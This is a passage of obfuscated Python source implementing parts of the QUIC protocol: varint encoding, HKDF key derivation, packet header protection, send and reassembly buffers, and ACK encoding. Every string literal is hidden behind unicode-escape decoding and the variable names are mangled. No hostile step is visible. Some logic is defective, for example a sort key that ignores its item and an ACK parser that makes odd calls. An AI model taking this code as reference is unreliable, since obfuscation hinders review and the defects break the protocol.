QUIC_HRR_RANDOM = bytes.fromhex(codecs.decode('\\u0063\\u0066\\u0032\\u0031\\u0061\\u0064\\u0037\\u0034\\u0065\\u0035\\u0039\\u0061\\u0036\\u0031\\u0031\\u0031\\u0062\\u0065\\u0031\\u0064\\u0038\\u0063\\u0030\\u0032\\u0031\\u0065\\u0036\\u0035\\u0062\\u0038\\u0039\\u0031\\u0063\\u0032\\u0061\\u0032\\u0031\\u0031\\u0031\\u0036\\u0037\\u0061\\u0062\\u0062\\u0038\\u0063\\u0035\\u0065\\u0030\\u0037\\u0039\\u0065\\u0030\\u0039\\u0065\\u0032\\u0063\\u0038\\u0061\\u0038\\u0033\\u0033\\u0039\\u0063', 'unicode_escape'))
QUIC_SAMPLE_SIZE = 16
QUIC_PN_LEN = 4
QUIC_MAX_PACKET = 1232
QUIC_MIN_INITIAL = 1200
QUIC_EPOCH_INITIAL, QUIC_EPOCH_HANDSHAKE, QUIC_EPOCH_APPLICATION = (0, 1, 2)
QUIC_EPOCH_NAMES = (codecs.decode('\\u0069\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c', 'unicode_escape'), codecs.decode('\\u0068\\u0061\\u006e\\u0064\\u0073\\u0068\\u0061\\u006b\\u0065', 'unicode_escape'), codecs.decode('\\u006f\\u006e\\u0065\\u002d\\u0072\\u0074\\u0074', 'unicode_escape'))
QUIC_FRAME = {codecs.decode('\\u0070\\u0061\\u0064\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'): 0, codecs.decode('\\u0070\\u0069\\u006e\\u0067', 'unicode_escape'): 1, codecs.decode('\\u0061\\u0063\\u006b', 'unicode_escape'): 2, codecs.decode('\\u0061\\u0063\\u006b\\u005f\\u0065\\u0063\\u006e', 'unicode_escape'): 3, codecs.decode('\\u0072\\u0065\\u0073\\u0065\\u0074\\u005f\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape'): 4, codecs.decode('\\u0073\\u0074\\u006f\\u0070\\u005f\\u0073\\u0065\\u006e\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'): 5, codecs.decode('\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f', 'unicode_escape'): 6, codecs.decode('\\u006e\\u0065\\u0077\\u005f\\u0074\\u006f\\u006b\\u0065\\u006e', 'unicode_escape'): 7, codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape'): 8, codecs.decode('\\u006d\\u0061\\u0078\\u005f\\u0064\\u0061\\u0074\\u0061', 'unicode_escape'): 16, codecs.decode('\\u006d\\u0061\\u0078\\u005f\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u005f\\u0064\\u0061\\u0074\\u0061', 'unicode_escape'): 17, codecs.decode('\\u006d\\u0061\\u0078\\u005f\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0073\\u005f\\u0062\\u0069\\u0064\\u0069', 'unicode_escape'): 18, codecs.decode('\\u006d\\u0061\\u0078\\u005f\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0073\\u005f\\u0075\\u006e\\u0069', 'unicode_escape'): 19, codecs.decode('\\u006e\\u0065\\u0077\\u005f\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u005f\\u0069\\u0064', 'unicode_escape'): 24, codecs.decode('\\u0072\\u0065\\u0074\\u0069\\u0072\\u0065\\u005f\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u005f\\u0069\\u0064', 'unicode_escape'): 25, codecs.decode('\\u0070\\u0061\\u0074\\u0068\\u005f\\u0063\\u0068\\u0061\\u006c\\u006c\\u0065\\u006e\\u0067\\u0065', 'unicode_escape'): 26, codecs.decode('\\u0070\\u0061\\u0074\\u0068\\u005f\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065', 'unicode_escape'): 27, codecs.decode('\\u0074\\u0072\\u0061\\u006e\\u0073\\u0070\\u006f\\u0072\\u0074\\u005f\\u0063\\u006c\\u006f\\u0073\\u0065', 'unicode_escape'): 28, codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u005f\\u0063\\u006c\\u006f\\u0073\\u0065', 'unicode_escape'): 29, codecs.decode('\\u0068\\u0061\\u006e\\u0064\\u0073\\u0068\\u0061\\u006b\\u0065\\u005f\\u0064\\u006f\\u006e\\u0065', 'unicode_escape'): 30, codecs.decode('\\u0064\\u0061\\u0074\\u0061\\u0067\\u0072\\u0061\\u006d', 'unicode_escape'): 48, codecs.decode('\\u0064\\u0061\\u0074\\u0061\\u0067\\u0072\\u0061\\u006d\\u005f\\u006c\\u0065\\u006e', 'unicode_escape'): 49}
QUIC_PARAM = {codecs.decode('\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0061\\u006c\\u005f\\u0064\\u0065\\u0073\\u0074\\u0069\\u006e\\u0061\\u0074\\u0069\\u006f\\u006e\\u005f\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u005f\\u0069\\u0064', 'unicode_escape'): 0, codecs.decode('\\u006d\\u0061\\u0078\\u005f\\u0069\\u0064\\u006c\\u0065\\u005f\\u0074\\u0069\\u006d\\u0065\\u006f\\u0075\\u0074', 'unicode_escape'): 1, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0065\\u006c\\u0065\\u0073\\u0073\\u005f\\u0072\\u0065\\u0073\\u0065\\u0074\\u005f\\u0074\\u006f\\u006b\\u0065\\u006e', 'unicode_escape'): 2, codecs.decode('\\u006d\\u0061\\u0078\\u005f\\u0075\\u0064\\u0070\\u005f\\u0070\\u0061\\u0079\\u006c\\u006f\\u0061\\u0064\\u005f\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): 3, codecs.decode('\\u0069\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u005f\\u006d\\u0061\\u0078\\u005f\\u0064\\u0061\\u0074\\u0061', 'unicode_escape'): 4, codecs.decode('\\u0069\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u005f\\u006d\\u0061\\u0078\\u005f\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u005f\\u0064\\u0061\\u0074\\u0061\\u005f\\u0062\\u0069\\u0064\\u0069\\u005f\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape'): 5, codecs.decode('\\u0069\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u005f\\u006d\\u0061\\u0078\\u005f\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u005f\\u0064\\u0061\\u0074\\u0061\\u005f\\u0062\\u0069\\u0064\\u0069\\u005f\\u0072\\u0065\\u006d\\u006f\\u0074\\u0065', 'unicode_escape'): 6, codecs.decode('\\u0069\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u005f\\u006d\\u0061\\u0078\\u005f\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u005f\\u0064\\u0061\\u0074\\u0061\\u005f\\u0075\\u006e\\u0069', 'unicode_escape'): 7, codecs.decode('\\u0069\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u005f\\u006d\\u0061\\u0078\\u005f\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0073\\u005f\\u0062\\u0069\\u0064\\u0069', 'unicode_escape'): 8, codecs.decode('\\u0069\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u005f\\u006d\\u0061\\u0078\\u005f\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0073\\u005f\\u0075\\u006e\\u0069', 'unicode_escape'): 9, codecs.decode('\\u0061\\u0063\\u006b\\u005f\\u0064\\u0065\\u006c\\u0061\\u0079\\u005f\\u0065\\u0078\\u0070\\u006f\\u006e\\u0065\\u006e\\u0074', 'unicode_escape'): 10, codecs.decode('\\u006d\\u0061\\u0078\\u005f\\u0061\\u0063\\u006b\\u005f\\u0064\\u0065\\u006c\\u0061\\u0079', 'unicode_escape'): 11, codecs.decode('\\u0064\\u0069\\u0073\\u0061\\u0062\\u006c\\u0065\\u005f\\u0061\\u0063\\u0074\\u0069\\u0076\\u0065\\u005f\\u006d\\u0069\\u0067\\u0072\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'): 12, codecs.decode('\\u0061\\u0063\\u0074\\u0069\\u0076\\u0065\\u005f\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u005f\\u0069\\u0064\\u005f\\u006c\\u0069\\u006d\\u0069\\u0074', 'unicode_escape'): 14, codecs.decode('\\u0069\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u005f\\u0073\\u006f\\u0075\\u0072\\u0063\\u0065\\u005f\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u005f\\u0069\\u0064', 'unicode_escape'): 15, codecs.decode('\\u0072\\u0065\\u0074\\u0072\\u0079\\u005f\\u0073\\u006f\\u0075\\u0072\\u0063\\u0065\\u005f\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u005f\\u0069\\u0064', 'unicode_escape'): 16, codecs.decode('\\u006d\\u0061\\u0078\\u005f\\u0064\\u0061\\u0074\\u0061\\u0067\\u0072\\u0061\\u006d\\u005f\\u0066\\u0072\\u0061\\u006d\\u0065\\u005f\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): 32}

def O0_fn_31(O0_var_1056):
    O0_var_1057 = int(O0_var_1056)
    if O0_var_1057 < 64:
        return 1
    if O0_var_1057 < 16384:
        return 2
    if O0_var_1057 < 1073741824:
        return 4
    return 8

def O0_fn_32(O0_var_1058):
    O0_var_1059 = int(O0_var_1058)
    if O0_var_1059 < 64:
        return bytes([O0_var_1059])
    if O0_var_1059 < 16384:
        return bytes([64 | O0_var_1059 >> 8, O0_var_1059 & 255])
    if O0_var_1059 < 1073741824:
        return bytes([128 | O0_var_1059 >> 24 & 63, O0_var_1059 >> 16 & 255, O0_var_1059 >> 8 & 255, O0_var_1059 & 255])
    return bytes([192 | O0_var_1059 >> 56 & 63]) + O0_var_1059.to_bytes(8, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))[1:]

def O0_fn_33(O0_var_1060, O0_var_1061):
    if len(O0_var_1060) - O0_var_1061 < 1:
        return None
    O0_var_1062 = O0_var_1060[O0_var_1061]
    O0_var_1063 = 1 << (O0_var_1062 >> 6)
    if len(O0_var_1060) - O0_var_1061 < O0_var_1063:
        return None
    O0_var_1064 = O0_var_1062 & 63
    for O0_var_1065 in range(1, O0_var_1063):
        O0_var_1064 = O0_var_1064 << 8 | O0_var_1060[O0_var_1061 + O0_var_1065]
    return (O0_var_1064, O0_var_1063)

def _ranges_remove(O0_var_1066, O0_var_1067, O0_var_1068):
    O0_var_1069 = []
    for O0_var_1070 in O0_var_1066:
        O0_var_1071, O0_var_1072 = (O0_var_1070[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')], O0_var_1070[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')] + O0_var_1070[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')])
        if O0_var_1072 <= O0_var_1067 or O0_var_1071 >= O0_var_1068:
            O0_var_1069.append(O0_var_1070)
            continue
        if O0_var_1071 < O0_var_1067:
            O0_var_1069.append({codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape'): O0_var_1071, codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'): O0_var_1067 - O0_var_1071})
        if O0_var_1072 > O0_var_1068:
            O0_var_1069.append({codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape'): O0_var_1068, codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'): O0_var_1072 - O0_var_1068})
    return O0_var_1069

def _ranges_union(O0_var_1073, O0_var_1074):
    O0_var_1075 = sorted(O0_var_1073 + O0_var_1074, key=lambda item: item[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')])
    O0_var_1076 = []
    for O0_var_1077 in O0_var_1075:
        O0_var_1078 = O0_var_1077[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')] + O0_var_1077[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')]
        if O0_var_1076 and O0_var_1077[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')] <= O0_var_1076[-1][codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')] + O0_var_1076[-1][codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')]:
            O0_var_1079 = O0_var_1076[-1]
            O0_var_1079[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')] = max(O0_var_1079[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')], O0_var_1078 - O0_var_1079[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')])
        else:
            O0_var_1076.append({codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape'): O0_var_1077[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')], codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'): O0_var_1077[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')]})
    return O0_var_1076

def _hkdf_extract(O0_var_1080, O0_var_1081, O0_var_1082):
    return hmac.new(O0_var_1081, O0_var_1082, O0_var_1080).digest()

def _hkdf_expand(O0_var_1083, O0_var_1084, O0_var_1085, O0_var_1086):
    O0_var_1087 = b''
    O0_var_1088 = b''
    O0_var_1089 = 1
    while len(O0_var_1087) < O0_var_1086:
        O0_var_1088 = hmac.new(O0_var_1084, O0_var_1088 + O0_var_1085 + bytes([O0_var_1089]), O0_var_1083).digest()
        O0_var_1087 += O0_var_1088
        O0_var_1089 += 1
    return O0_var_1087[:O0_var_1086]

def O0_fn_34(O0_var_1090, O0_var_1091, O0_var_1092, O0_var_1093, O0_var_1094):
    O0_var_1095 = b'tls13 ' + (O0_var_1092.encode() if isinstance(O0_var_1092, str) else O0_var_1092)
    O0_var_1096 = O0_var_1093 or b''
    O0_var_1097 = bytes([O0_var_1094 >> 8 & 255, O0_var_1094 & 255]) + bytes([len(O0_var_1095)]) + O0_var_1095 + bytes([len(O0_var_1096)]) + O0_var_1096
    return _hkdf_expand(O0_var_1090, O0_var_1091, O0_var_1097, O0_var_1094)

class QuicKeys:

    def __init__(self, O0_var_1098, O0_var_1099, O0_var_1100):
        self.hash = O0_var_1098
        self.cipher_name = O0_var_1099
        self.secret = O0_var_1100
        O0_var_1101 = 32 if O0_var_1099 == codecs.decode('\\u0061\\u0065\\u0073\\u002d\\u0032\\u0035\\u0036\\u002d\\u0067\\u0063\\u006d', 'unicode_escape') else 16
        self.key = O0_fn_34(O0_var_1098, O0_var_1100, codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079', 'unicode_escape'), b'', O0_var_1101)
        self.iv = O0_fn_34(O0_var_1098, O0_var_1100, codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u0020\\u0069\\u0076', 'unicode_escape'), b'', 12)
        self.hp_key = O0_fn_34(O0_var_1098, O0_var_1100, codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u0020\\u0068\\u0070', 'unicode_escape'), b'', O0_var_1101)
        self.tag_size = 16

    def _nonce(self, O0_var_1102):
        O0_var_1103 = bytearray(self.iv)
        O0_var_1104 = int(O0_var_1102)
        for O0_var_1105 in range(8):
            O0_var_1103[11 - O0_var_1105] ^= O0_var_1104 & 255
            O0_var_1104 >>= 8
        return bytes(O0_var_1103)

    def mask(self, O0_var_1106):
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        O0_var_1107 = Cipher(algorithms.AES(self.hp_key), modes.ECB()).encryptor()
        return (O0_var_1107.update(O0_var_1106) + O0_var_1107.finalize())[:5]

    def seal(self, O0_var_1108, O0_var_1109, O0_var_1110):
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        return AESGCM(self.key).encrypt(self._nonce(O0_var_1108), O0_var_1110, O0_var_1109)

    def open(self, O0_var_1111, O0_var_1112, O0_var_1113):
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        return AESGCM(self.key).decrypt(self._nonce(O0_var_1111), O0_var_1113, O0_var_1112)

def O0_fn_35(O0_var_1114, O0_var_1115=False):
    O0_var_1116 = QuicKeys(O0_var_1114.hash, O0_var_1114.cipher_name, O0_fn_34(O0_var_1114.hash, O0_var_1114.secret, codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u0020\\u006b\\u0075', 'unicode_escape'), b'', len(O0_var_1114.secret)))
    if O0_var_1115:
        O0_var_1116.hp_key = O0_var_1114.hp_key
    return O0_var_1116

def O0_fn_36(O0_var_1117, O0_var_1118):
    O0_var_1119 = _hkdf_extract(codecs.decode('\\u0073\\u0068\\u0061\\u0032\\u0035\\u0036', 'unicode_escape'), QUIC_INITIAL_SALT, O0_var_1117)
    O0_var_1120 = b'client in' if O0_var_1118 else b'server in'
    O0_var_1121 = b'server in' if O0_var_1118 else b'client in'
    return {codecs.decode('\\u0073\\u0065\\u006e\\u0064', 'unicode_escape'): QuicKeys(codecs.decode('\\u0073\\u0068\\u0061\\u0032\\u0035\\u0036', 'unicode_escape'), codecs.decode('\\u0061\\u0065\\u0073\\u002d\\u0031\\u0032\\u0038\\u002d\\u0067\\u0063\\u006d', 'unicode_escape'), O0_fn_34(codecs.decode('\\u0073\\u0068\\u0061\\u0032\\u0035\\u0036', 'unicode_escape'), O0_var_1119, O0_var_1120, b'', 32)), codecs.decode('\\u0072\\u0065\\u0063\\u0076', 'unicode_escape'): QuicKeys(codecs.decode('\\u0073\\u0068\\u0061\\u0032\\u0035\\u0036', 'unicode_escape'), codecs.decode('\\u0061\\u0065\\u0073\\u002d\\u0031\\u0032\\u0038\\u002d\\u0067\\u0063\\u006d', 'unicode_escape'), O0_fn_34(codecs.decode('\\u0073\\u0068\\u0061\\u0032\\u0035\\u0036', 'unicode_escape'), O0_var_1119, O0_var_1121, b'', 32))}

class QuicByteSender:

    def __init__(self, O0_var_1122):
        self.connection = O0_var_1122
        self.data = b''
        self.pending = []
        self.unacked = []
        self.frontier = 0
        self.fin = False
        self.fin_unacked = False

    @property
    def sent_end(self):
        return len(self.data)

    def append(self, O0_var_1123, O0_var_1124):
        if O0_var_1123:
            self.data += O0_var_1123
            self.pending.append({codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape'): len(self.data) - len(O0_var_1123), codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'): len(O0_var_1123)})
        if O0_var_1124:
            self.fin = True
            self.fin_unacked = True

    def take(self, O0_var_1125):
        if not self.pending or O0_var_1125 <= 0:
            return None
        O0_var_1126 = self.pending[0]
        O0_var_1127 = min(O0_var_1126[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')], O0_var_1125)
        O0_var_1128 = {codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape'): O0_var_1126[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')], codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'): O0_var_1127}
        O0_var_1126[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')] += O0_var_1127
        O0_var_1126[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')] -= O0_var_1127
        if not O0_var_1126[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')]:
            self.pending.pop(0)
        O0_var_1128[codecs.decode('\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape')] = self.data[O0_var_1128[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')]:O0_var_1128[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')] + O0_var_1127]
        O0_var_1128[codecs.decode('\\u0072\\u0065\\u0074\\u0072\\u0061\\u006e\\u0073\\u006d\\u0069\\u0074\\u0074\\u0065\\u0064', 'unicode_escape')] = O0_var_1128[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')] < self.frontier
        self.frontier = max(self.frontier, O0_var_1128[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')] + O0_var_1127)
        self.unacked = _ranges_union(self.unacked, [{codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape'): O0_var_1128[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')], codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'): O0_var_1127}])
        return O0_var_1128

    def take_fin(self):
        if not self.fin or not self.fin_unacked or self.pending or self.unacked:
            return False
        self.fin_unacked = False
        return True

    def ack(self, O0_var_1129, O0_var_1130, O0_var_1131):
        self.unacked = _ranges_remove(self.unacked, O0_var_1129, O0_var_1129 + O0_var_1130)
        if O0_var_1131 and self.fin and (O0_var_1129 + O0_var_1130 >= len(self.data)):
            self.fin_unacked = False
        self.connection.on_send_progress()

    def loss(self):
        if self.unacked:
            self.frontier = self.unacked[0][codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')]
            self.pending = _ranges_union(self.pending, self.unacked)
            self.pending.sort(key=lambda item: item[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')])
            self.unacked = []
        if self.fin:
            self.fin_unacked = True

    def loss_ranges(self, O0_var_1132):
        for O0_var_1133 in O0_var_1132:
            if not O0_var_1133[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')]:
                if O0_var_1133.get(codecs.decode('\\u0066\\u0069\\u006e', 'unicode_escape')) and self.fin:
                    self.fin_unacked = True
                continue
            self.unacked = _ranges_remove(self.unacked, O0_var_1133[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')], O0_var_1133[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')] + O0_var_1133[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')])
            self.pending = _ranges_union(self.pending, [{codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape'): O0_var_1133[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')], codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'): O0_var_1133[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')]}])
            self.pending.sort(key=lambda item: O0_var_1133[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')])

    def idle(self):
        return not self.pending and (not self.unacked) and (not self.fin_unacked)

class QuicOffsetBuffer:

    def __init__(self):
        self.contiguous = 0
        self.pending = []

    def accept(self, O0_var_1134, O0_var_1135):
        if O0_var_1134 > self.contiguous + 1048576:
            return b''
        if O0_var_1134 < self.contiguous:
            O0_var_1136 = self.contiguous - O0_var_1134
            if O0_var_1136 >= len(O0_var_1135):
                return b''
            O0_var_1135 = O0_var_1135[O0_var_1136:]
            O0_var_1134 = self.contiguous
        if not O0_var_1135:
            return b''
        if O0_var_1134 != self.contiguous:
            self.pending.append({codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape'): O0_var_1134, codecs.decode('\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape'): bytes(O0_var_1135)})
            return b''
        O0_var_1137 = [O0_var_1135]
        self.contiguous += len(O0_var_1135)
        O0_var_1138 = True
        while O0_var_1138:
            O0_var_1138 = False
            for O0_var_1139, O0_var_1140 in enumerate(self.pending):
                if O0_var_1140[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')] == self.contiguous:
                    O0_var_1137.append(O0_var_1140[codecs.decode('\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape')])
                    self.contiguous += len(O0_var_1140[codecs.decode('\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape')])
                    self.pending.pop(O0_var_1139)
                    O0_var_1138 = True
                    break
        return b''.join(O0_var_1137)

def _quic_apply_protection(O0_var_1141, O0_var_1142, O0_var_1143, O0_var_1144):
    if len(O0_var_1142) < O0_var_1143 + 4 + QUIC_SAMPLE_SIZE:
        return None
    O0_var_1145 = O0_var_1141.mask(O0_var_1142[O0_var_1143 + 4:O0_var_1143 + 4 + QUIC_SAMPLE_SIZE])
    O0_var_1146 = bytearray(O0_var_1142)
    O0_var_1146[0] ^= O0_var_1145[0] & (15 if O0_var_1144 else 31)
    for O0_var_1147 in range(QUIC_PN_LEN):
        O0_var_1146[O0_var_1143 + O0_var_1147] ^= O0_var_1145[1 + O0_var_1147]
    return bytes(O0_var_1146)

def _quic_remove_protection(O0_var_1148, O0_var_1149, O0_var_1150, O0_var_1151):
    if len(O0_var_1149) < O0_var_1150 + 4 + QUIC_SAMPLE_SIZE:
        return None
    O0_var_1152 = O0_var_1148.mask(O0_var_1149[O0_var_1150 + 4:O0_var_1150 + 4 + QUIC_SAMPLE_SIZE])
    O0_var_1153 = bytearray(O0_var_1149)
    O0_var_1153[0] ^= O0_var_1152[0] & (15 if O0_var_1151 else 31)
    O0_var_1154 = (O0_var_1153[0] & 3) + 1
    for O0_var_1155 in range(O0_var_1154):
        O0_var_1153[O0_var_1150 + O0_var_1155] ^= O0_var_1152[1 + O0_var_1155]
    O0_var_1156 = 0
    for O0_var_1155 in range(O0_var_1154):
        O0_var_1156 = O0_var_1156 * 256 + O0_var_1153[O0_var_1150 + O0_var_1155]
    return (bytes(O0_var_1153[:O0_var_1150 + O0_var_1154]), O0_var_1156)

def _quic_decode_packet_number(O0_var_1157, O0_var_1158, O0_var_1159):
    O0_var_1160 = O0_var_1157 + 1
    O0_var_1161 = (1 << O0_var_1158) - 1
    O0_var_1162 = O0_var_1160 & ~O0_var_1161 | O0_var_1159
    O0_var_1163 = 1 << O0_var_1158 - 1
    if O0_var_1162 + O0_var_1163 <= O0_var_1160:
        O0_var_1162 += 1 << O0_var_1158
    elif O0_var_1162 > O0_var_1160 + O0_var_1163 and O0_var_1162 >= 1 << O0_var_1158:
        O0_var_1162 -= 1 << O0_var_1158
    return O0_var_1162

def _quic_encode_ack(O0_var_1164):
    O0_var_1165 = bytearray([QUIC_FRAME[codecs.decode('\\u0061\\u0063\\u006b', 'unicode_escape')]])
    O0_var_1166 = sorted(O0_var_1164, key=lambda item: item[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')])
    O0_var_1167 = O0_var_1166[-1]
    O0_var_1168 = O0_var_1167[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')] + O0_var_1167[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')] - 1

    def O0_fn_37(O0_var_1169):
        return O0_fn_32(O0_var_1169)
    O0_var_1165 += O0_fn_37(O0_var_1168)
    O0_var_1165 += O0_fn_37(0)
    O0_var_1165 += O0_fn_37(len(O0_var_1166) - 1)
    O0_var_1165 += O0_fn_37(O0_var_1168 - O0_var_1167[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')])
    O0_var_1170 = O0_var_1167[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')]
    for O0_var_1171 in reversed(O0_var_1166[:-1]):
        O0_var_1172 = O0_var_1171[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')] + O0_var_1171[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')] - 1
        O0_var_1165 += O0_fn_37(O0_var_1170 - O0_var_1172 - 2)
        O0_var_1165 += O0_fn_37(O0_var_1172 - O0_var_1171[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')])
        O0_var_1170 = O0_var_1171[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')]
    return bytes(O0_var_1165)

def _quic_ranges_from_ack(O0_var_1173):
    O0_var_1174 = O0_var_1173[codecs.decode('\\u006e\\u0075\\u006d\\u0062\\u0065\\u0072', 'unicode_escape')](O0_var_1173)
    O0_var_1175 = O0_var_1173[codecs.decode('\\u006e\\u0075\\u006d\\u0062\\u0065\\u0072', 'unicode_escape')](O0_var_1173)
    O0_var_1176 = O0_var_1173[codecs.decode('\\u006e\\u0075\\u006d\\u0062\\u0065\\u0072', 'unicode_escape')](O0_var_1173)
    O0_var_1177 = O0_var_1173[codecs.decode('\\u006e\\u0075\\u006d\\u0062\\u0065\\u0072', 'unicode_escape')](O0_var_1173)
